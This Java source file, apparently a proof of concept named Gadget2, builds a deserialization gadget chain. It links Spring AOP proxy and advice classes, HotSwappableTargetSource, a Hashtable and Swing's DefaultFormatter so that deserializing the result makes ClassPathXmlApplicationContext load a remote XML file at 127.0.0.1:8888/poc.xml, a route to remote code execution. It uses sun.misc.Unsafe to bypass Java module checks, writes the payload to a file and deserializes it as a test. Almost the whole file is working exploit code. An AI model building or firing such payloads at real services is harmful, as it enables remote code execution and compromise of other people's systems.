package org.example;

import org.springframework.aop.aspectj.AspectJAfterReturningAdvice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor;
import org.springframework.aop.interceptor.ExposeInvocationInterceptor;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import sun.misc.Unsafe;


import javax.swing.text.DefaultFormatter;
import java.io.*;
import java.lang.reflect.*;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Gadget2 {
    public static void main(String[] args) throws Exception {

        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        HashMap<String, String> targetMap = new HashMap<>();
        targetMap.put("argss", "http://127.0.0.1:8888/poc.xml");
        advisedSupport.setTarget(targetMap);


        Class<?> aClass = Class.forName("org.springframework.aop.interceptor.ExposeInvocationInterceptor");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        ExposeInvocationInterceptor aspectJAroundAdvice0 = (ExposeInvocationInterceptor) declaredConstructor.newInstance();
//        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
//        pointcut.setExpression(".*get");
        advisedSupport.addAdvice(aspectJAroundAdvice0);

        AspectJAfterReturningAdvice aspectJAfterReturningAdvice = getAspectJAfterReturningAdvice();
        AfterReturningAdviceInterceptor aspectJAroundAdvice = new AfterReturningAdviceInterceptor(aspectJAfterReturningAdvice);

        setFieldValue(aspectJAfterReturningAdvice,"argumentNames",new String[]{"java.lang.Object"});
        setFieldValue(aspectJAfterReturningAdvice,"returningName","java.lang.Object");
//        setFieldValue(aspectJAfterReturningAdvice,"argumentNames",new String[]{"java.lang.Object"});
//        setFieldValue(aspectJAfterReturningAdvice,"throwingName","java.lang.Object");
//        setFieldValue(aspectJAfterReturningAdvice,"joinPointArgumentIndex",-1);
//        setFieldValue(aspectJAfterReturningAdvice,"joinPointStaticPartArgumentIndex",-1);
        setFieldValue(aspectJAfterReturningAdvice,"discoveredReturningType",String.class);


        advisedSupport.addAdvice(aspectJAroundAdvice);

        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Map proxyObj = (Map) Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Map.class}, handler);

        Hashtable htobject = new Hashtable();
        htobject.put("argss","test");
        HotSwappableTargetSource htkey = new HotSwappableTargetSource(htobject);
        HotSwappableTargetSource htvalue = new HotSwappableTargetSource(proxyObj);

        Hashtable hashtable = new Hashtable();
        hashtable.put(htkey, "b");
        Method addEntry = hashtable.getClass().getDeclaredMethod("addEntry", int.class, Object.class, Object.class, int.class);
        patchModule(Gadget2.class,hashtable.getClass());
        addEntry.setAccessible(true);
        addEntry.invoke(hashtable, 0, htvalue, "2B", 0);

        FileOutputStream fos = new FileOutputStream("bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(hashtable);
        oos.close();

        // 从文件中反序列化对象
        FileInputStream fis = new FileInputStream("bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();

    }
    private static void patchModule(Class clazz,Class goalclass){
        try {
            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe)unsafeField.get(null);
            Object ObjectModule = Class.class.getMethod("getModule").invoke(goalclass);
            Class currentClass = clazz;
            long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        } catch (Exception e) {
        }
    }



    private static AspectJAfterReturningAdvice getAspectJAfterReturningAdvice() throws Exception {
//        Method mapGetMethod = Map.class.getMethod("get", Object.class);
//        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
////        pointcut.setExpression(".*get");  // 匹配 Map.get()
//        Map<String, String> targetMap = new HashMap<>();
//        SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(targetMap);
//        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(
//                mapGetMethod, pointcut, aif
//        );
//        return advice;
        DefaultFormatter defaultFormatter = new DefaultFormatter();
        defaultFormatter.setValueClass(ClassPathXmlApplicationContext.class);
        Method mapGetMethod = DefaultFormatter.class.getMethod("stringToValue", String.class);
        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
        pointcut.setExpression("");
        SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(defaultFormatter);
        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(
                mapGetMethod, pointcut, aif
        );
        return advice;

//        Constructor<ClassPathXmlApplicationContext> declaredConstructor = ClassPathXmlApplicationContext.class.getDeclaredConstructor(String.class);
//        Object o = newInstanceWithoutConstructor(TypeFactory.class);
//        TypeResolutionContext ctxt = new TypeResolutionContext.Empty((TypeFactory) o);
//
//        // 3. 创建 AnnotationMap（存储注解信息，这里用空的）
//        AnnotationMap classAnn = new AnnotationMap();
//        AnnotationMap[] paramAnn = new AnnotationMap[0]; // 无参数时用空数组
//
//        // 4. 初始化 AnnotatedConstructor 对象
//        AnnotatedConstructor annotatedConstructor = new AnnotatedConstructor(
//                ctxt, declaredConstructor, classAnn, paramAnn
//        );
//        Method mapGetMethod = annotatedConstructor.getClass().getMethod("call1", Object.class);
//        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
//        pointcut.setExpression("");
//        SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(annotatedConstructor);
//        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(
//                mapGetMethod, pointcut, aif
//        );
//        return advice;

    }

    public static void setFieldValue(Object obj,String filedName,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj.getClass(),filedName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static Field getField(Class clazz,String fieldName) throws NoSuchFieldException {

        while (true){
            Field[] fields = clazz.getDeclaredFields();
            for(Field field:fields){
                if(field.getName().equals(fieldName)){
                    return field;
                }
            }
            if(clazz == Object.class){
                break;
            }
            clazz = clazz.getSuperclass();
        }
        throw new NoSuchFieldException(fieldName);
    }
}
